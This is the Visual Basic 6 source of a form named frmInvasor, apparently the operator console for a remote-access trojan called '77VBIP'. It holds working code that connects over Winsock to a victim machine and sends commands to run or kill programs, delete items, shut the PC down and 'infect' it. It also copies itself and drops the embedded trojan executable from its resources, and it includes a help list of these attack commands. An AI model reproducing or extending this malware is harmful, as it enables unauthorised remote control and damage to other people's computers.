VERSION 5.00
Begin VB.Form frmInvasor 
   BackColor       =   &H00D39570&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "$0ckE7"
   ClientHeight    =   4605
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7110
   Icon            =   "frmInvasor.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4605
   ScaleWidth      =   7110
   StartUpPosition =   3  'Windows Default
   Begin HIT.Winsock w1 
      Left            =   1740
      Top             =   1965
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.CommandButton Command1 
      Caption         =   "BE!"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   7320
      TabIndex        =   2
      Top             =   4065
      Width           =   480
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Top             =   4050
      Width           =   7110
   End
   Begin VB.PictureBox status 
      Align           =   2  'Align Bottom
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   0
      ScaleHeight     =   255
      ScaleWidth      =   7080
      TabIndex        =   1
      Top             =   4320
      Width           =   7110
   End
   Begin VB.TextBox log 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   4065
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   -30
      Width           =   7110
   End
End
Attribute VB_Name = "frmInvasor"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Percent As Integer
Public Function Ups(pb As Control, ByVal Percent As Integer, Optional ByVal ShowPercent = False)
    'Replacement for progress bar..looks nicer also
    Dim sNum                            As String    'use percent
    'Dim Num$
    If Not pb.AutoRedraw Then 'picture in memory ?
        pb.AutoRedraw = -1 'no, make one
    End If
    pb.Cls 'clear picture in memory
    pb.ScaleWidth = 100 'new sclaemodus
    pb.DrawMode = 10 'not XOR Pen Modus
    If ShowPercent = True Then
    Num$ = Format$(Percent, "###0") + "%"
    pb.CurrentX = 50 - pb.TextWidth(Num$) / 2
    pb.CurrentY = (pb.ScaleHeight - pb.TextHeight(Num$)) / 2
    pb.Print Num$ 'print percent
    End If
    pb.Line (0, 0)-(Percent, pb.ScaleHeight), , BF
    pb.Refresh 'show differents
End Function

Private Sub Command1_Click()
On Error Resume Next
Dim str As String
Dim pt As String
Dim ori As String
Dim des As String
Dim tem As String
Dim l As Integer

If Left$(Text1.Text, 9) = "conectar " Then
tem = Right$(Text1.Text, Len(Text1.Text) - 9)
l = InStr(1, tem, "@", vbTextCompare) - 1
ori = Left$(tem, l)
des = Right$(tem, Len(tem) - l - 1)
w1.Connect ori, des
End If
If Left$(Text1.Text, 7) = "sndcmd " Then
des = Right$(Text1.Text, Len(Text1.Text) - 7)
w1.SendData des
End If
If Text1.Text = "lstcmd" Then
log.Text = log.Text & vbCrLf & vbCrLf & "Comandos Disponíveis" & vbCrLf & _
"conectar endereço@porta = Conecta a algum servidor" & vbCrLf & _
"sndcmd ? = envia um comando qualquer ao servidor conectado" & vbCrLf & _
"./Show#me?the$commands = Mostra os comandos para controlar o trojan 77VBIP" & vbCrLf & _
"compile#77VBIP - Build the Trojan 77VBIP" & vbCrLf & _
"======FIM======"
End If

'''''''''''''''''''''COMPLEX STRINGS

If Left$(Text1.Text, 12) = "./copy#file " Then
tem = Right$(Text1.Text, Len(Text1.Text) - 12)
log.Text = log.Text & vbCrLf & "%STARTING COPY ACTION..."
l = InStr(1, tem, "*", vbTextCompare) - 1
ori = Left$(tem, l)
log.Text = log.Text & vbCrLf & "!SOURCE: " & ori
des = Right$(tem, Len(tem) - l - 1)
log.Text = log.Text & vbCrLf & "?DESTINATION: " & des
log.Text = log.Text & vbCrLf & "#TRYING TO COPY..."
FileCopy ori, des
log.Text = log.Text & vbCrLf & "##COPY OK!"
End If

'''''''''''''''''''''''SIMPLE STRINGS

log.Text = log.Text & vbCrLf & Text1.Text
If Left$(Text1.Text, 17) = "./setremote#port " Then
str = Right$(Text1.Text, Len(Text1.Text) - 17)
w1.RemotePort = str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "REMOTE PORT DEFINED: " & str
Text1.Text = Empty
Exit Sub

 End If
 If Left$(Text1.Text, 14) = "./me@call?app " Then
str = Right$(Text1.Text, Len(Text1.Text) - 14)
Call Shell(str, vbNormalFocus)
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
  If Left$(Text1.Text, 12) = "./build#dir " Then
str = Right$(Text1.Text, Len(Text1.Text) - 12)
log.Text = log.Text & vbCrLf & "TRYING TO BUILD A DIRECTORY..."
MkDir str
log.Text = log.Text & vbCrLf & "DIRECTORY: " & str & " BUILD OK!"
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
  If Left$(Text1.Text, 15) = "./me@auto#copy " Then
  str = Right$(Text1.Text, Len(Text1.Text) - 15)
  log.Text = log.Text & vbCrLf & vbCrLf & "Starting copy..." & vbCrLf & "COPYING TO: " & str
If Len(App.Path) = 3 Then
pt = App.Path
Else
pt = App.Path & "\"
End If
FileCopy pt & App.EXEName & ".exe", str
log.Text = log.Text & vbCrLf & vbCrLf & "COPYED IN " & str
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
 If Left$(Text1.Text, 31) = "##be@the./garbage*in!workspace " Then
str = Right$(Text1.Text, Len(Text1.Text) - 31)
w1.SendData "infect! " & str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "Making garbage in the otherside PC... " & str
Text1.Text = Empty
Exit Sub

Text1.Text = Empty
 End If
If Left$(Text1.Text, 11) = "./goto#net " Then
Dim ip As String
ip = Right(Text1.Text, Len(Text1.Text) - 11)
w1.RemoteHost = ip
log.Text = log.Text & vbCrLf & Time & vbCrLf & "TRYING TO CONNECT TO " & ip
w1.Connect
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
'commandS REMOTOS

If Left$(Text1.Text, 4) = "msg " Then
str = Text1.Text
w1.SendData str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "cpr " Then
str = Text1.Text
w1.SendData str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "exe " Then
str = Text1.Text
w1.SendData str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "mkd " Then
str = Text1.Text
w1.SendData str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "del " Then
str = Text1.Text
w1.SendData str
log.Text = log.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

Select Case Text1.Text
Case Is = "end"
End
Case Is = "calc"
str = "calc"
w1.SendData str
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
Case Is = "notepad"

str = "note"
w1.SendData str
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "clr$creen"
log.Text = Empty
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "serverpath"

str = "checknet"
w1.SendData str
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "shutdown"
Text1.Text = Empty
str = "shutdown"
w1.SendData str
Exit Sub
Text1.Text = Empty
Case Is = "ctrpanel"
Text1.Text = Empty
Case Is = "compile#77VBIP"
Dim nosme As String
Dim p_ret As String
If Len(App.Path) > 3 Then
nosme = App.Path & "\77VBIP.exe"
Else
nosme = App.Path & "77VBIP.exe"
End If
p_ret = StrConv(LoadResData("77VBIP", "EXE"), vbUnicode)
Open nosme For Binary As #1
Put #1, , p_ret
Close #1
log.Text = log.Text & vbCrLf & Time & vbCrLf & "77VBIP Compiled in " & nosme
Text1.Text = Empty
Exit Sub
Case Is = "time"
Text1.Text = Empty

Exit Sub
Text1.Text = Empty
Case Is = "closesckserver"
str = "closesckme"
w1.SendData str
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "cdopen"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "solitarie"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "./Show#me?the$commands"
log.Text = log.Text & vbCrLf & vbCrLf & "**1nV@d3R C0mM@nD$**" _
& vbCrLf & "end = closesck ME" _
& vbCrLf & "notepad = OPENS THE SERVER NOTEPAD" _
& vbCrLf & "serverpath = SHOWS THE SERVER LOCATE PATH" _
& vbCrLf & "shutdown = SHUTDOWNS THE SERVERS PC" _
& vbCrLf & "ctrpanel = OPENS THE SERVER CONTROL PANNEL" _
& vbCrLf & "time = SHOWS THE TIME OF SERVERS PC IS ON" _
& vbCrLf & "closesckserver = closesckS THE SERVER" _
& vbCrLf & "./me@auto#copy = AUTO COPY ME!" _
& vbCrLf & "##be@the./garbage*in!workspace = TRASH THE OTHERSIDE PC INFECTING THEM!" _
& vbCrLf & "cdopen = OPENS THE SERVER CDROM TRAY" _
& vbCrLf & "solitarie = OPENS THE SERVER SOLITARIE" _
& vbCrLf & "./setremote#port ? = CHANGE THE ? TO THE SELECTED PORT TO CONNECT" _
& vbCrLf & "./goto#net ? = CHANGE THE ? TO THE SELECTED HOST IP TO CONNECT" _
& vbCrLf & "msg = SEND A MESSAGE TO SERVER" _
& vbCrLf & "./me@call?app = CALL AN APP HERE" _
& vbCrLf & "./copy#file SOURCE*DESTINATION = COPY FILE$" _
& vbCrLf & "./build#dir = BUILD A DIR" _
& vbCrLf & "cpr = closesckS A PROGRAM IN THE SERVER" _
& vbCrLf & "exe = CALLS A PROGRAM IN THE SERVER" _
& vbCrLf & "del = KILLS A PROGRAM IN THE SERVER" _
& vbCrLf & "mkd = MAKE A PERSONAL PATH IN THE SERVER" _
& vbCrLf & "**3ND 0F L1$T**"
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "lstapp"
Text1.Text = Empty

Exit Sub
Text1.Text = Empty
Case Is = "msword"
Text1.Text = Empty

Exit Sub
Text1.Text = Empty
Case Is = "scandisk"
Text1.Text = Empty

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "mplaya"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "vb6"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "dir"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "paint"

Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "./sock#closesck"
Text1.Text = Empty
w1.CloseSck
Exit Sub
Text1.Text = Empty
End Select


Text1.Text = Empty
End Sub

Private Sub Command1_GotFocus()
Text1.SetFocus
End Sub

Private Sub Form_Load()
On Error Resume Next
log.Text = "======================" & _
vbCrLf & "|    Bem Vindo ao Socket    |" & _
vbCrLf & "======================" & _
vbCrLf & vbCrLf & "Digite 'lstcmd' para ver a lista de comandos"
w1.LocalPort = 23
End Sub

Private Sub log_Change()
log.SelStart = Len(Text1.Text)
End Sub

Private Sub log_GotFocus()
Text1.SetFocus
End Sub

Private Sub status_GotFocus()
Text1.SetFocus
End Sub

Private Sub Text1_Change()
log.SelStart = Len(log.Text)
End Sub

Private Sub w1_closesck()
On Error Resume Next
status.Cls
status.Print "Conexão Fechada"
log.Text = log.Text & vbCrLf & "Conexão Fechada"
End Sub

Private Sub w1_Connect()
On Error Resume Next
status.Cls
status.Print "Estamos On-Line"
log.Text = log.Text & vbCrLf & "Estamos On-Line"
End Sub

Private Sub w1_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
status.Cls
status.Print "Servidor Tentando Comunicação"
log.Text = log.Text & vbCrLf & "Servidor Tentando Comunicação"
End Sub

Private Sub w1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim dados As String
status.Cls
status.Print "Transferindo Dados"
w1.GetData dados
log.Text = log.Text & vbCrLf & "Transferindo Dados"
log.Text = log.Text & vbCrLf & vbCrLf & "Dados Transferidos:"
log.Text = log.Text & vbCrLf & dados
End Sub

Private Sub w1_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
status.Cls
status.Print "Erro de Soquete"
log.Text = log.Text & vbCrLf & "Erro de Soquete"
End Sub


Private Sub w1_SendComplete()
On Error Resume Next
status.Cls
status.Print "Envio Completo"
log.Text = log.Text & vbCrLf & "Envio Completo"
End Sub

Private Sub w1_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
On Error Resume Next
'Percent = Format((BytesAlreadySent / bytesRemaining) * 100, "00")
'Ups status, Percent, False
End Sub
